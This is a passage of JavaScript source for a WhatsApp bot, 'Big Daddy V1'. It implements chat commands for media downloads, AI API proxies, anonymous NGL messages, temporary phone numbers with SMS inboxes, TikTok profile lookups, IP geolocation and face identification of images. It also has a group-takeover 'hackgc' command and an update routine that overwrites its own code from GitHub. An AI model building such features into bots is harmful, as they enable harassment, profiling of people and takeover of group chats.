        replygcxeon('An error occurred while connecting to Llama AI. Please try again later.');
    }
    break;
}
case 'big-Daddy-ai': {
    if (!text) {
        replygcxeon('Hello! How can I assist you today.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/jeeves-chat2', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replygcxeon(replyMessage);
        } else {
            replygcxeon('Failed to get a response from Big Daddy AI.');
        }
    } catch (error) {
        console.error('Error fetching from Big Daddy ai:', error);
        replygcxeon('An error occurred while connecting to Big Daddy Server. Please try again later.');
    }
    break;
}
case 'ngl': {
    if (!text || !text.includes('|')) {
        return replygcxeon(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl phista1|Hey bro!`);
    }

    try {
        // Parse the username and message
        const [username, message] = text.split('|').map(t => t.trim());

        if (!username || !message) {
            return replygcxeon(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl davidcyril11|Hello there!`);
        }

        // Construct the NGL link using the username
        const nglLink = `https://ngl.link/${username}`;

        // Call the NGL API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/tools/ngl`, {
            params: { link: nglLink, text: message }
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            replygcxeon(`✅ *Message Sent Successfully!*\n\n📩 Message: "${message}"\n🔗 NGL Username: ${username}`);
        } else {
            replygcxeon(`❌ *Failed to send the message.* Please try again.`);
        }
    } catch (error) {
        console.error('Error in NGL command:', error);
        replygcxeon(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'tiktok':
case 'tt':
case 'tiktokdl': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} <URL or Link>`);

    try {
        // Fetch video data from the TikTok API
        const response = await axios.get(`https://api.siputzx.my.id/api/tiktok`, {
            params: { url: text }
        });

        const { status, data } = response.data;

        if (status && data && data.urls.length > 0) {
            const videoUrl = data.urls[0]; // Use the first available download link
            const videoTitle = data.type || "TikTok Video";

            // Send the video as a normal video message
            await XeonBotInc.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: 'video/mp4',
                caption: `🎥 *TikTok Video Downloaded Successfully*`
            }, { quoted: m });
        } else {
            replygcxeon(`*❌ Failed to fetch the TikTok video. Please check the URL and try again.*`);
        }
    } catch (error) {
        console.error("Error in TikTok Downloader:", error);
        replygcxeon(`*An error occurred while downloading the TikTok video.*`);
    }
    break;
}  
case 'facebook': case 'fb': case 'fbdl': case 'fbdownload': {
    if (!text) {
        return reply(`*Please provide a Facebook URL or video link.*`);
    }

    try {
        // Notify the user the bot is processing the request
        await XeonBotInc.sendMessage(m.chat, { text: `⏳ *Processing your request...*` });

        // Fetch video data from the API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/facebook`, {
            params: { url: text }
        });

        const { status, data } = apiResponse.data;

        if (status && data && data.video) {
            const videoLink = data.video;
            const videoTitle = data.userInfo?.name || "Facebook Video";
            const thumbnail = data.thumbnail;

            // Send the video as a normal video
            await XeonBotInc.sendMessage(m.chat, {
                video: { url: videoLink },
                mimetype: 'video/mp4',
                caption: `🎥 *Video Title:* ${videoTitle}\n\nEnjoy your video! 🎬`
            }, { quoted: m });
        } else {
            reply(`*❌ Failed to download the video. Please check the link and try again.*`);
        }
    } catch (error) {
        console.error("Error in Facebook Downloader:", error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}  
case 'instagram': 
case 'ig': 
case 'igvideo': 
case 'igimage': 
case 'igvid': 
case 'igimg': 
case 'igdownload': 
case 'instadl': 
case 'instagramdl': 
case 'igdl': {
    if (!text || !text.startsWith('http')) {
        return replygcxeon(`*Usage:* .igdl <Instagram URL>\n\n*Example:* .igdl https://www.instagram.com/p/CyIqjWusPec/`);
    }

    try {
        // Call the Instagram downloader API
        const apiResponse = await axios.get(`https://bk9.fun/download/instagram2`, {
            params: { url: text },
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            const mediaList = apiResponse.data.BK9;

            if (mediaList.length === 0) {
                return replygcxeon(`No media found at the provided Instagram URL.`);
            }

            // Send each media item
            for (const media of mediaList) {
                await XeonBotInc.sendMessage(
                    m.chat,
                    {
                        video: { url: media.url }, // Send as a video
                        caption: `*Instagram Downloader*\n\n🔗 URL: ${text}`,
                    },
                    { quoted: m }
                );
            }
        } else {
            replygcxeon(`*Failed to fetch media from the provided URL.*`);
        }
    } catch (error) {
        console.error('Error in Instagram Downloader command:', error);
        replygcxeon(`*An error occurred while processing your request:*\n\n${error.message}`);
    }
    break;
}
    case 'diary': {
    const diary = loadDiary();
    const userId = m.sender;
    if (!args[0]) {
        const userDiary = diary[userId] || [];
        if (userDiary.length === 0) return replygcxeon("Your diary is empty. Add entries with `.diary <entry>`");
        const diaryContent = userDiary.map((entry, i) => `${i + 1}. ${entry}`).join('\n');
        replygcxeon(`📓 *Your Diary:*\n\n${diaryContent}`);
    } else {
        const entry = text.trim();
        if (!diary[userId]) diary[userId] = [];
        diary[userId].push(entry);
        saveDiary(diary);
        replygcxeon(`✅ *Added to your diary:* "${entry}"`);
    }
    break;
}
case 'generate': {
    if (!text) {
        return replygcxeon(`*Usage:* /generate <prompt>\n\n*Example:* /generate cat`);
    }

    try {
        // Call the Flux API
        const apiUrl = `https://api.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;
        
        // Send the generated image as a response
        await XeonBotInc.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `🎨 *Big Daddy V1 Image Generator*\n\n📄 *Prompt:* ${text}`,
        }, { quoted: m });
    } catch (error) {
        console.error('Error in Flux command:', error);
        replygcxeon(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
    case 'text2image': case 'textimg': case 'dalle': case 'magicstudio': {
    if (!text) {
        replygcxeon('Please provide a prompt.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/magicstudio', {
            params: { prompt: text },
            responseType: 'arraybuffer' // Ensures we handle the image data properly
        });

        const imageBuffer = Buffer.from(response.data, 'binary');

        // Send the image to the user
        await XeonBotInc.sendMessage(m.chat, { image: imageBuffer, caption: `✨ Generated Image ✨` });
    } catch (error) {
        console.error('Error fetching from MagicStudio API:', error);
        replygcxeon('An error occurred while generating the image. Please try again later.');
    }
    break;
}
    case 'text2speech':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify the text to convert to speech! Usage: text2speech <your text>');
        }

        const query = text.trim();
        if (query.length > 500) {
            return replygcxeon('❌ The text is too long! Please limit your input to 500 characters.');
        }

        replygcxeon('🔍 Generating speech from text...');
        const { botToken, groupId } = getRandomBot();
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/text2speech ${query}` }),
        });       
        if (!commandResponse.ok) {
            throw new Error('Failed please try again');
        }

        // Step 3: Fetch the audio file URL from Telegram using fetchTelegramFile
        const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);

        // Step 4: Send the audio back to WhatsApp
        if (audioFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    audio: { url: audioFileUrl },
                    mimetype: 'audio/mpeg',
                    ptt: true, // Set to true if you want it to send as a voice note
                    caption: `🔊 *Text-to-Speech Output*\n\n🗣️ *Text*: ${query}`,
                },
                { quoted: m }
            );
        } else {
            await replygcxeon('❌ Failed to generate the audio file');
        }

    } catch (err) {
        await replygcxeon('❌ An error occurred, please try again later.');
        console.error(err);
    }
    break;
    case 'ip': {
    if (!text) return replygcxeon(`*Please provide an IP address!*\n\n*Example:* ${prefix + command} 8.8.8.8`);

    try {
        const apiResponse = await fetch(`https://endpoint.web.id/tools/cekip?key=gojou&id=${text}`);
        const ipv = await apiResponse.json();

        if (ipv.status) {
            const shannz = ipv.result;
            const tesk = `*[ IP CHECKER ]*\n\n` +
                         `> *IP:* ${shannz.ip}\n` +
                         `> *City:* ${shannz.city}\n` +
                         `> *Country:* ${shannz.country}\n` +
                         `> *Location:* ${shannz.loc}\n` +
                         `> *ORG:* ${shannz.org}\n` +
                         `> *Postal Code:* ${shannz.postal}\n` +
                         `> *Time Zone:* ${shannz.timezone}\n` +
                         `> *More Details:* ${shannz.readme}`;
            replygcxeon(tesk);
        } else {
            replygcxeon(`*❌ Error or IP not found! Please check the input and try again.*`);
        }
    } catch (error) {
        console.error('Error in IP Checker command:', error);
        replygcxeon(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
    case 'gemini2': {
    if (!text) {
        return replygcxeon('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/gemini', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replygcxeon(replyMessage);
        } else {
            replygcxeon('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replygcxeon('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'gemini': {
    if (!text) {
        return replygcxeon('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/acloudai', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replygcxeon(replyMessage);
        } else {
            replygcxeon('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replygcxeon('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'tempnumber': {
    replygcxeon('🔍 Searching for available numbers randomly...');

    try {
        const countries = await getOnlineCountries(); // Fetch all online countries
        if (countries.length === 0) {
            replygcxeon("❌ No online countries available at the moment.");
            break;
        }

        // Select a random country
        const randomCountry = countries[Math.floor(Math.random() * countries.length)];
        const numbers = await getCountryNumbers(randomCountry.name); // Fetch numbers for the random country

        if (numbers.length === 0) {
            replygcxeon(`❌ No numbers available for ${randomCountry.name}.`);
            break;
        }

        // Select a random number from the country
        const randomNumber = numbers[Math.floor(Math.random() * numbers.length)];
        replygcxeon(`📞 *Temporary Number Found:*\n\n🌍 *Country:* ${randomCountry.name}\n📱 *Number:* ${randomNumber.fullNumber}`);
    } catch (error) {
        console.error(error);
        replygcxeon("❌ Failed to fetch temporary numbers. Please try again later.");
    }
    break;
}

case 'numberinbox': {
    const [country, number] = text.split('|');
    if (!country || !number) {
        return replygcxeon("❓ Usage: .numberinbox <country>|<number>\nExample: .numberinbox Russia|123456789");
    }

    replygcxeon(`📬 Checking inbox for number ${number} in ${country}...`);

    try {
        const inbox = await getNumberInbox(country.trim(), number.trim());
        if (!inbox || inbox.length === 0) {
            replygcxeon(`📭 Inbox for ${number} in ${country} is empty or the number is offline.`);
        } else {
            const messages = inbox.map((msg, index) => `📩 *${index + 1}*. From: ${msg.sender}\n   Message: ${msg.text}`).join("\n\n");
            replygcxeon(`📬 *Inbox for ${number}:*\n\n${messages}`);
        }
    } catch (error) {
        console.error(error);
        replygcxeon("❌ Failed to fetch the inbox. Please check the number and try again.");
    }
    break;
}

case 'onlinecountries': {
    replygcxeon("🌍 Fetching available countries...");

    try {
        const countries = await getOnlineCountries(); // Fetch all online countries
        if (countries.length === 0) {
            replygcxeon("❌ No online countries available at the moment.");
            break;
        }

        // Generate a professional list of countries
        const countryList = countries
            .map(c => `🌍 *Country:* ${c.name}\n   Code: ${c.code}`)
            .join("\n\n");
        replygcxeon(`🌍 *Available Online Countries:*\n\n${countryList}`);
    } catch (error) {
        console.error(error);
        replygcxeon("❌ Failed to fetch available countries. Please try again later.");
    }
    break;
}
case 'lyrics': {
    if (!text) return replygcxeon(`*Example:* ${prefix + command} faded | Alan Walker`);

    try {
        // Extract song title and artist from input
        const [title, artist] = text.split('|').map(str => str.trim());
        if (!title || !artist) return replygcxeon(`*Please provide both song title and artist, e.g.:* ${prefix + command} faded | Alan Walker`);

        // Notify user that the bot is fetching lyrics
        await XeonBotInc.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
        await replygcxeon(`Searching for lyrics...`);

        // Fetch lyrics from API
        const apiUrl = `https://api.davidcyriltech.my.id/lyrics?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
        const response = await axios.get(apiUrl);

        if (response.data && response.data.lyrics) {
            const { title, artist, lyrics } = response.data;

            // Format the lyrics response
            const lyricsMessage = `🎵 *LYRICS FOUND*\n\n` +
                                  `*🎶 Song:* ${title}\n` +
                                  `*🎤 Artist:* ${artist}\n\n` +
                                  `${lyrics}\n`;

            // Send lyrics to the user
            replygcxeon(lyricsMessage);
        } else {
            replygcxeon(`*No lyrics found for:* ${title} by ${artist}`);
        }
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        replygcxeon(`*Failed to fetch lyrics. Possible reasons:*\n1. Invalid title or artist.\n2. API issues.\n\n*Error Details:* ${error.message}`);
    }
    break;
}
case 'hdimg': case 'remini': {
    // Check if the command is a reply to an image
    if (!/image/.test(mime)) {
        return replygcxeon(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    if (!quoted) {
        return replygcxeon(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    try {
        // Download the image locally
        const mediaPath = await XeonBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image to Catbox to get a public URL
        const uploadResponse = await catbox(mediaPath); // Using Catbox uploader

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replygcxeon(`*UPLOAD ERROR!! MESSAGE :*\n\n> Failed to upload the image to Catbox.`);
        }

        const imageUrl = uploadResponse.url; // Get the uploaded image URL

        // Use the Remini API with the uploaded image URL
        const enhancedImageUrl = `https://bk9.fun/tools/enhance?url=${imageUrl}`;

        // Send the enhanced image back to the user
        await XeonBotInc.sendMessage(m.chat, {
            image: { url: enhancedImageUrl },
            caption: `*SUCCESSFULLY ENHANCED YOUR IMAGE 😍!!*\n\n`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Remini command:', error);
        replygcxeon(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'imgscan': {
    if (!/image/.test(mime)) {
        return replygcxeon(`*❌ REQUEST ERROR!*\n\n> Please reply to an image with *${prefix}imgscan* to scan it.`);
    }

    if (!quoted) {
        return replygcxeon(`*❌ REQUEST ERROR!*\n\n> Please reply to an image with *${prefix}imgscan* to scan it.`);
    }

    try {
        // Download the image locally
        const mediaPath = await XeonBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image (replace with your upload function)
        const uploadResponse = await uploadToImgur(mediaPath); // Ensure you have this function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replygcxeon(`*❌ UPLOAD ERROR!*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl;

        // Call the Gemini API for image analysis
        const apiResponse = await axios.get(`https://bk9.fun/ai/geminiimg`, {
            params: { url: imageUrl, q: "Who is this?" }
        });

        if (apiResponse.data.status) {
            const result = apiResponse.data.BK9;

            // Send the result to the user
            replygcxeon(`*🔍 IMAGE SCAN RESULT:*\n\n${result}`);
        } else {
            replygcxeon(`*❌ SCANNER ERROR!*\n\n> Unable to process the image. Please try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in imgscan command:', error);
        replygcxeon(`*❌ AN ERROR OCCURRED!*\n\n> ${error.message}`);
    }
    break;
}
case 'imgsearch': case 'img': {
    if (!text) {
        return replygcxeon(`*Usage:* .bingimg <query>\n\n*Example:* .img cat`);
    }

    try {
        // Call the Bing Image Search API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/s/bimg`, {
            params: { query: text }
        });

        if (apiResponse.status === 200 && apiResponse.data.status) {
            const images = apiResponse.data.data;

            if (images.length === 0) {
                return replygcxeon(`No images found for "${text}". Please try another query.`);
            }

            // Send up to 5 images
            const maxImages = Math.min(images.length, 5);
            for (let i = 0; i < maxImages; i++) {
                await XeonBotInc.sendMessage(m.chat, {
                    image: { url: images[i] },
                    caption: `🔎 *Image Search Results*\n\n📄 *Query:* "${text}"\n📷 *Image ${i + 1}/${maxImages}*`,
                }, { quoted: m });
            }
        } else {
            replygcxeon(`❌ *ERROR:* Failed to fetch images. Please try again.`);
        }
    } catch (error) {
        console.error('Error in Image Search command:', error);
        replygcxeon(`❌ *AN ERROR OCCURRED:* ${error.message}`);
    }
    break;
}
    case 'shazam': {
    // Ensure the command is used on audio or video under 4MB
    if (!/audio|video/.test(mime)) {
        return replygcxeon(`*Reply to an audio or video file with .shazam to identify the track.*`);
    }

    if (!quoted) {
        return replygcxeon(`*Reply to an audio or video file with .shazam to identify the track.*`);
    }

    try {
        // Step 1: Download the media locally
        const mediaPath = await XeonBotInc.downloadAndSaveMediaMessage(quoted);

        // Check file size (4MB max for the Shazam API)
        const stats = fs.statSync(mediaPath);
        if (stats.size > 4 * 1024 * 1024) { // 4MB limit
            fs.unlinkSync(mediaPath);
            return replygcxeon(`*The file size exceeds 4MB, which is not supported by the Shazam API.*`);
        }

        // Step 2: Upload the media to Catbox to get a public URL
        const uploadResponse = await catbox(mediaPath);

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath);
            return replygcxeon(`*ERROR!! MESSAGE :*\n\n> Failed to upload the file.`);
        }

        const mediaUrl = uploadResponse.url;

        // Step 3: Call the PaxSenix Shazam API
        const apiUrl = `https://api.paxsenix.biz.id/tools/shazam?url=${encodeURIComponent(mediaUrl)}`;
        const apiResponse = await axios.get(apiUrl);

        if (!apiResponse.data || !apiResponse.data.ok || !apiResponse.data.track) {
            fs.unlinkSync(mediaPath);
            return replygcxeon(`*Failed to identify the track. Please try again later.*`);
        }

        // Extract track information
        const track = apiResponse.data.track;
        const trackTitle = track.title || "Unknown Title";
        const trackArtist = track.artist || "Unknown Artist";
        const trackUrl = track.url || "No URL Available";
        const trackIsrc = track.isrc || "No ISRC Available";

        // Step 4: Send the result with the specified image
        const resultImage = 'https://files.catbox.moe/xdxmwk.jpg'; // Specified image
        await XeonBotInc.sendMessage(m.chat, {
            image: { url: resultImage },
            caption: `🎵 *TRACK IDENTIFIED!!*\n\n` +
                     `*Title:* ${trackTitle}\n` +
                     `*Artist:* ${trackArtist}\n` +
                     `*ISRC:* ${trackIsrc}\n` +
                     `*More Info:* [Click Here](${trackUrl})`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Shazam command:', error);
        replygcxeon(`*AN ERROR OCCURRED!! MESSAGE*`);
    }
    break;
}
case 'url': {
    // Validate that the message is a reply to an image or video
    if (!quoted || !/video/.test(mime) && !/image/.test(mime)) {
        return replygcxeon(`*REQUEST ERROR!! MESSAGE:*\n\n> *Reply/Send Image/Video With Caption .url*`);
    }

    try {
        // Download the media locally
        const mediaPath = await XeonBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the file to Catbox
        const uploadResponse = await catbox(mediaPath);

        // Check upload response and send the result
        if (uploadResponse && uploadResponse.url) {
            await XeonBotInc.sendMessage(m.chat, {
                text: `*UPLOAD SUCCESSFUL!!*\n\n> *URL:*\n\n${uploadResponse.url}`
            }, { quoted: m });
        } else {
            await replygcxeon(`*UPLOAD FAILED, PLEASE TRY AGAIN*`);
        }

        // Clean up: Remove the saved media file after processing
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in URL command:', error);
        await replygcxeon(`*AN ERROR OCCURRED!! MESSAGE:*\n\n> ${error.message}`);
    }
    break;
}
    case "apk":
case "apkdl": {
    if (!text) return replygcxeon("✨ *Please specify the APK you want to download!*");

    try {
        // Fetch APK search results
        let kyuu = await fetchJson(`https://bk9.fun/search/apk?q=${text}`);
        if (!kyuu.BK9 || kyuu.BK9.length === 0) {
            return replygcxeon("❌ *No APKs found for the given search query.*");
        }

        // Fetch APK download link
        let tylor = await fetchJson(`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
        
        // Send download link
        const downloadMessage = `🎮 *APK Download Link*\n\n` +
                                `📦 *Name:* ${tylor.BK9.name}\n` +
                                `🔗 *Download Link:* [Click Here](${tylor.BK9.dllink})\n`;

        await XeonBotInc.sendMessage(
            m.chat,
            {
                text: downloadMessage,
                contextInfo: {
                    externalAdReply: {
                        title: `Download APK: ${tylor.BK9.name}`,
                        body: "Click the link to download the APK!",
                        thumbnailUrl: tylor.BK9.thumb, // Using the app's URL thumbnail image
                        sourceUrl: tylor.BK9.dllink,
                        mediaType: 2,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            },
            { quoted: m }
        );
    } catch (error) {
        console.error('Error in APK command:', error);
        replygcxeon("❌ *An error occurred while processing the request. Please try again later.*");
    }
    break;
}
    case 'text2pdf':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify the text to convert to PDF! Usage: text2pdf <your text>');
        }

        const query = text.trim();

        replygcxeon('🔍 Generating PDF from text...');
        const { botToken, groupId } = getRandomBot();
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Step 1: Send the /text2pdf command to Telegram bot
        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/text2pdf ${query}` }),
        });

        if (!commandResponse.ok) {
            throw new Error('Failed to send text-to-PDF command to Telegram bot.');
        }

        // Step 2: Fetch the PDF file URL from Telegram using fetchTelegramFile
        const pdfFileUrl = await fetchTelegramFile('pdf', botToken, groupId);

        // Step 3: Send the generated PDF back to WhatsApp
        if (pdfFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    document: { url: pdfFileUrl },
                    mimetype: 'application/pdf',
                    caption: `📄 *Text-to-PDF Output*\n\n📝 *Text*: ${query}`,
                },
                { quoted: m }
            );
        } else {
            await replygcxeon('❌ Failed to generate the PDF file. Please try again.');
        }

    } catch (err) {
        await replygcxeon('❌ An error occurred, please try again later.');
        console.error(err);
    }
    break;  
case 'mediafire': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} link...`);

    try {
        // Construct the API URL for MediaFire
        const apiUrl = `https://api.davidcyriltech.my.id/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

        // Check if the API response indicates success
        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;

            // Send the file back to the user
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    document: { url: downloadLink },
                    mimetype: mimeType,
                    fileName: fileName,
                    caption: `📦 *File Name:* ${fileName}`,
                },
                { quoted: m }
            );
        } else {
            // If the API response does not indicate success, reply with an error message
            replygcxeon(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {
        // Log the error for debugging purposes
        console.error('Error during MediaFire command:', error);

        // Reply with a generic error message
        replygcxeon(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
case 'screenshot': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} link`);

    try {
        // Construct the API URL for the screenshot
        const apiUrl = `https://api.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}&device=tablet`;

        // Fetch the screenshot from the API
        const apiResponse = await axios.get(apiUrl);

        // Check if the API response indicates success
        if (apiResponse.data && apiResponse.data.success) {
            const { screenshotUrl } = apiResponse.data;

            // Send the screenshot back to the user
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    image: { url: screenshotUrl },
                    caption: `🖼️ *Web Screenshot* \n\n🌐 URL: ${text}\n📱 Device: Tablet`,
                },
                { quoted: m }
            );
        } else {
            // If the API response does not indicate success, reply with an error message
            replygcxeon(`*Failed to capture the screenshot! Please check the URL and try again.*`);
        }
    } catch (error) {
        // Log the error for debugging purposes
        console.error('Error during ssweb command:', error);

        // Reply with a generic error message
        replygcxeon(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
    case 'chatgpt': 
case 'blackbox': 
case 'chatgpt4': {
    if (!text) {
        XeonBotInc.sendMessage(m.chat, { text: '❓ *Please ask me anything!*' }, { quoted: m });
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            XeonBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
        } else {
            XeonBotInc.sendMessage(m.chat, { text: '*Failed to fetch response from the AI. Please try again later.*' }, { quoted: m });
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        XeonBotInc.sendMessage(m.chat, { text: '*An error occurred while fetching the AI response. Please try again later.*' }, { quoted: m });
    }
    break;
}
case 'tiktokstalk':
case 'ttstalk': {
    if (!args[0]) return replygcxeon('Please provide a TikTok username!');

    const username = args[0];

    try {
        const response = await axios.get(`https://bk9.fun/stalk/tiktok?q=${username}`);

        // Check if the request was successful
        if (response.data.status === true) {
            const profile = response.data.BK9;

            // Format and send profile information with a thumbnail (profile picture)
            await XeonBotInc.sendMessage(m?.chat, {
                image: { url: profile.profile },
                caption: `*[ TIKTOK PROFILE INFO ]*\n
- *🔖Name:* ${profile.name}
- *🔖Username:* ${profile.username}
- *👥Follower:* ${profile.followers}
- *🫂Following:* ${profile.following}
- *Likes:* ${profile.likes}
-  *📌Bio:* ${profile.bio || 'No bio available'}
- *🏝️Description:*: ${profile.desc || 'No description available'}`
            });

        } else {
            replygcxeon('Could not retrieve the profile. Please make sure the username is correct!');
        }
    } catch (error) {
        console.error(error);
        replygcxeon('There was an error fetching the TikTok profile information.');
    }
    break;
}
case 'demoteall': {
    if (!m.isGroup) return replygcxeon('This command can only be used in groups.');
    if (!isBotAdmins) return replygcxeon('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return replygcxeon('Only group admins can use this command.');

    for (let admin of groupAdmins) {
        if (admin !== botNumber) {
            try {
                await XeonBotInc.groupParticipantsUpdate(from, [admin], 'demote');
                await delay(500); // Add a 1-second delay between each request
            } catch (err) {
                console.log(`Error demoting ${admin}:`, err.message);
            }
        }
    }
    replygcxeon('Successfully demoted all admins to members.');
    break;
}
case 'gpt4': 
case 'gpt3': 
case 'gptpro': {
    if (!text) {
        XeonBotInc.sendMessage(m.chat, { text: '❓ *Please ask me anything!*' }, { quoted: m });
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            XeonBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
        } else {
            XeonBotInc.sendMessage(m.chat, { text: '*Failed to fetch response from the AI. Please try again later.*' }, { quoted: m });
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        XeonBotInc.sendMessage(m.chat, { text: '*An error occurred while fetching the AI response. Please try again later.*' }, { quoted: m });
    }
    break;
}
case 'update':
if (!isCreator) return replygcxeon(mess.owner); 
  try { 
    console.log('Starting Big Daddy V1 update...'); 
    // Send an initial reply about the update
    await replygcxeon("*Big Daddy V1 Updating*...");

    // Simulate loading progress
    await loading(from);

    // GitHub URLs for the files to be updated
    const GITHUB_P_JS_URL = 'https://raw.githubusercontent.com/Phi-star/Phistar-/main/BigDaddy%201.js';
    const GITHUB_PACKAGE_JSON_URL = 'https://raw.githubusercontent.com/Phi-star/Phistar-/main/package.json';

    // Download and overwrite the files with the latest versions from GitHub
    await downloadFile(GITHUB_P_JS_URL, './p.js');
    await downloadFile(GITHUB_PACKAGE_JSON_URL, './package.json');
    
    // Notify the user that the update is complete
    await replygcxeon("*Big Daddy V1 Update Complete!*");
    
    // Clear the cache of the old p.js file
    delete require.cache[require.resolve('./p.js')];
    
    console.log('Bot updated successfully.');
  } 
  catch (error) {
    console.error('Error updating Big Daddy V1:', error);
    await replygcxeon('❌ Failed to update the bot. Please try again later.');
  } 
  break;
    case 'hackgc':
    if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
    try {
        const groupId = m.chat; // Current group ID
        const targetUser = m.sender; // The sender initiating the hack

        // Step 1: Simulate hacking progression
        const hackingSteps = [
            { percentage: 10, message: "Establishing secure connection..." },
            { percentage: 30, message: "Bypassing group security protocols..." },
            { percentage: 50, message: "Attempting to gain admin privileges..." },
            { percentage: 70, message: "Adding ghost (fake) contacts to the group..." },
            { percentage: 85, message: "Neutralizing existing admin accounts..." },
            { percentage: 100, message: "Finalizing hack and locking group access..." }
        ];

        for (const step of hackingSteps) {
            await replygcxeon(
                `🛠️ *HACK IN PROGRESS*\n\n` +
                `Progress: *${step.percentage}%*\n` +
                `Action: ${step.message}\n\n` +
                `Loading... █${'█'.repeat(step.percentage / 10)}${'░'.repeat(10 - step.percentage / 10)}`
            );
            await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for effect
        }

        // Step 2: Make the user an admin
